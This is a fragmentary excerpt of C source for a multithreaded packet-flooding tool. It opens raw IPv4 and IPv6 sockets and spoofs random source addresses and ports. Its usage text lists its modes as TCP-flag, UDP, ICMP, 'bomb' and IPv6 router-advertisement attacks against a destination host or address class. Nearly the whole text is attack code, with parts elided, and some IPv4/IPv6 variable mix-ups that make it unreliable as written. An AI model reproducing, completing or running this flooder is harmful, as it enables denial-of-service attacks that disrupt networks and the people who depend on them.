...
void handle_exit(int sig) {
  int packets;
  packets = thread_data_array[1].packets + thread_data_array[2].packets +
            thread_data_array[4].packets + thread_data_array[8].packets +
            thread_data_array[16].packets + thread_data_array[32].packets +
            thread_data_array[64].packets + thread_data_array[128].packets +
            thread_data_array[256].packets + thread_data_array[512].packets +
            thread_data_array[1024].packets + thread_data_array[2048].packets +
            thread_data_array[4096].packets + thread_data_array[8192].packets +
...
char *class2ip(const char *class) {
  ...
  switch (j) {
  case 0:
    sprintf(ip, "%s.%d.%d.%d", class, (int)random() % 245 + 1,
            (int)random() % 225 + 1, (int)random() % 215 + 1);
    break;
  case 1:
    sprintf(ip, "%s.%d.%d", class, (int)random() % 245 + 1,
            (int)random() % 215 + 1);
    break;
  case 2:
...
void *send_tcp(void *arg) {
  ...
  if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0) {
    do {
      memset(&packet, 0x0,
             sizeof(packet.ip) + sizeof(packet.tcp) + param2->datasize);
      ...
      if (param2->th_flags == TH_URG || param2->a_flags == TCP_FRG)
        ...
        packet.tcp.th_urp = 0;
      packet.tcp.th_sport =
          thread_data_array[0].s_lport == 0
              ? random()
              : htons(thread_data_array[0].s_lport +
                      (random() % (thread_data_array[0].s_hport -
                                   thread_data_array[0].s_lport + 1)));
      packet.tcp.th_dport =
          thread_data_array[0].d_lport == 0
              ? random()
              : htons(thread_data_array[0].d_lport +
                      (random() % (thread_data_array[0].d_hport -
                                   thread_data_array[0].d_lport + 1)));
      checksum.tcp = packet.tcp;
      packet.tcp.th_sum = xchecksum((void *)&checksum, sizeof(checksum));
      param2->packets++;
    } while (sendto(param2->socket, &packet, (sizeof packet), 0,
                    (struct sockaddr *)&thread_data_array[0].destination4,
  ...
  if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1) {
    do {
      ...
      if (param2->th_flags == TH_URG || param2->a_flags == TCP_FRG)
        ...
        packet.tcp.th_urp = 0;
      packet6.tcp.th_sport =
          thread_data_array[0].s_lport == 0
              ? random()
              : htons(thread_data_array[0].s_lport +
                      (random() % (thread_data_array[0].s_hport -
                                   thread_data_array[0].s_lport + 1)));
      packet6.tcp.th_dport =
          thread_data_array[0].d_lport == 0
              ? random()
              : htons(thread_data_array[0].d_lport +
                      (random() % (thread_data_array[0].d_hport -
      ...
      packet.tcp.th_sum = xchecksum((void *)&checksum, sizeof(checksum));
      param2->packets++;
    } while (sendto(param2->socket, &packet6.tcp, (sizeof packet6), 0,
                    (struct sockaddr *)&thread_data_array[0].destination6,
  ...
  if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0) {
    do {
      ...
      param2->packets++;
                    ...
                    (struct sockaddr *)&thread_data_array[0].destination4,
                    sizeof(thread_data_array[0].destination4)));
  } else if (thread_data_array[0].flag4 == 0 &&
    ...
    do {
      ...
      packet6.udp.uh_sport =
          thread_data_array[0].s_lport == 0
              ? random()
              : htons(thread_data_array[0].s_lport +
                      (random() % (thread_data_array[0].s_hport -
                                   thread_data_array[0].s_lport + 1)));
      packet6.udp.uh_dport =
          thread_data_array[0].d_lport == 0
              ? random()
              : htons(thread_data_array[0].d_lport +
                      (random() % (thread_data_array[0].d_hport -
      ...
      param2->packets++;
    } while (sendto(param2->socket, &packet6, (sizeof packet6), 0,
                    (struct sockaddr *)&thread_data_array[0].destination6,
                    sizeof(thread_data_array[0].destination6)));
  }
  return 0;
...
void *send_icmp(void *arg) {
  ...
  if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0) {
    ...
    do {
      ...
      param2->packets++;
    } while (sendto(param2->socket, &packet6.icmp, (sizeof packet6), 0,
                    (struct sockaddr *)&thread_data_array[0].destination6,
                    sizeof(thread_data_array[0].destination6)));
  }
  return 0;
...
static void usage(const char *argv0) {
  ...
  printf(" -I ICMP   attack                   \e[1;37m(\e[0m\e[0;31mno "
         "options\e[0m\e[1;37m)\e[0m\n");
  printf(" -R Router attack                   \e[1;37m(\e[0m\e[0;31mno "
         "options\e[0m\e[1;37m)\e[0m\n");
  printf(" -T TCP  attack                 \e[1;37m(\e[0m0:FIN   1: "
         "SYN\e[1;37m)\e[0m\n");
  printf("                                \e[1;37m(\e[0m2:RST   "
         "3:PUSH\e[1;37m)\e[0m\n");
  printf("                                \e[1;37m(\e[0m4:ACK   5: "
         "URG\e[1;37m)\e[0m\n");
  printf("                                \e[1;37m(\e[0m6:ECE   7: "
         "CWR\e[1;37m)\e[0m\n");
  printf("                                \e[1;37m(\e[0m8:NOF   "
         "9:FRAG\e[1;37m)\e[0m\n");
  printf(" -B BMB attack [type,size]   \e[1;37m[\e[0m0:TCP 1:UDP "
         "2:RAW\e[1;37m]\e[0m\n");
  printf(" -h destination ip                  \e[1;37m(\e[0m\e[0;31mno "
         "default\e[0m\e[1;37m)\e[0m\n");
  printf(" -d destination class               \e[1;37m(\e[0m\e[0;31mno "
         "default\e[0m\e[1;37m)\e[0m\n");
  printf(" -s source class/ip                     "
         "\e[1;37m(\e[m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
  printf(" -p destination port range [start,end]  "
         "\e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
  printf(" -q source port range [start,end]       "
         "\e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
  printf(" -t timeout                         \e[1;37m(\e[0m\e[0;31mno "
         "default\e[0m\e[1;37m)\e[0m\n");
  printf(" -w window size [ 1-65535 ]             "
         "\e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
  printf(" -H help                             \e[1;37m(\e[0m\e[0;31mdisplay "
         "this help\e[0m\e[1;37m)\e[0m\n");
...
int main(int argc, char *argv[]) {
  ...
  if ((!thread_data_array[0].flag4 && !thread_data_array[0].flag6) ||
      (!thread_data_array[0].a_flags) || (!thread_data_array[0].timeout)) {
    usage(argv[0]);
  }
  if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0) {
    int i;
        ...
        if (thread_data_array[i].a_flags <= TCP_FRG ||
          ...
          if ((thread_data_array[i].socket =
            ...
            exit(-1);
                   ...
                   thread_data_array[i].a_flags == UDP_CFF) {
          if ((thread_data_array[i].socket =
                   socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
            perror("socket");
            exit(-1);
          }
        }
        if (thread_data_array[i].a_flags != UDP_BMB) {
          if (setsockopt(thread_data_array[i].socket, IPPROTO_IP, IP_HDRINCL,
                         (char *)&on, sizeof(on)) < 0) {
            perror("setsockopt");
            exit(-1);
          }
    ...
    printf(
        "[IPv4] Packeting (%s) from (%s) with flags (%i) for (%i) seconds.\n\n",
        thread_data_array[0].dst_class != NULL
            ? thread_data_array[0].dst_class
            : inet_ntop(AF_INET, &thread_data_array[0].destination4.sin_addr,
                        thread_data_array[0].DestIP4,
                        sizeof(thread_data_array[0].DestIP4)),
        thread_data_array[0].src_class != NULL ? thread_data_array[0].src_class
                                               : "random",
        thread_data_array[0].a_flags, thread_data_array[0].timeout);
    ...
    for (i = TCP_FIN; i <= ICMP_ECHO_G; i *= 2) {
      if (thread_data_array[i].initialized == 1) {
        if (thread_data_array[i].a_flags <= TCP_BMB ||
          ...
          if ((thread_data_array[i].socket =
            ...
            exit(-1);
                   ...
                   thread_data_array[i].a_flags == UDP_CFF) {
          if ((thread_data_array[i].socket =
                   socket(AF_INET6, SOCK_RAW, IPPROTO_UDP)) < 0) {
            perror("socket");
            exit(-1);
          }
        ...
        if (thread_data_array[i].a_flags != UDP_BMB) {
          if (setsockopt(thread_data_array[i].socket, IPPROTO_IPV6, IPV6_TCLASS,
                         (char *)&on, sizeof(on)) < 0) {
            perror("setsockopt");
            exit(-1);
          }
    ...
    printf(
        "[IPv6] Packeting (%s) from (%s) with flags (%i) for (%i) seconds.\n\n",
        thread_data_array[0].dst_class != NULL
            ? thread_data_array[0].dst_class
        ...
        thread_data_array[0].src_class, thread_data_array[0].a_flags,
  ...
  for (i = TCP_FIN; i <= ICMP_ECHO_G; i *= 2) {
    if (thread_data_array[i].a_flags == TCP_FIN) {
      ...
      if (pthread_create(&attack_thread[i], NULL, &send_tcp,
    ...
    if (thread_data_array[i].a_flags == TCP_BMB) {
      thread_data_array[i].thread = i;
      thread_data_array[i].packets = 0;
      if (pthread_create(&attack_thread[i], NULL, &send_bomb,
                         (void *)&thread_data_array[i]) != 0) {
        printf("+ Thread error:\n");
        perror("- pthread_create()\n");
      }
    ...
    if (thread_data_array[i].a_flags == UDP_CFF) {
      thread_data_array[i].thread = i;
      thread_data_array[i].packets = 0;
      if (pthread_create(&attack_thread[i], NULL, &send_udp,
                         (void *)&thread_data_array[i]) != 0) {
        printf("+ Thread error:\n");
        perror("- pthread_create()\n");
      }
    ...
    if (thread_data_array[i].a_flags == ICMP_ECHO_G) {
      thread_data_array[i].thread = i;
      thread_data_array[i].packets = 0;
      if (pthread_create(&attack_thread[i], NULL, &send_icmp,
                         (void *)&thread_data_array[i]) != 0) {
        printf("+ Thread error:\n");
        perror("- pthread_create()\n");
      }
    ...
    if (thread_data_array[i].a_flags == ICMP6_ROUTERADV) {
      thread_data_array[i].thread = i;
      thread_data_array[i].packets = 0;
      if (pthread_create(&attack_thread[i], NULL, &send_icmp_ra,
                         (void *)&thread_data_array[i]) != 0) {
        printf("+ Thread error:\n");
        perror("- pthread_create()\n");
      }
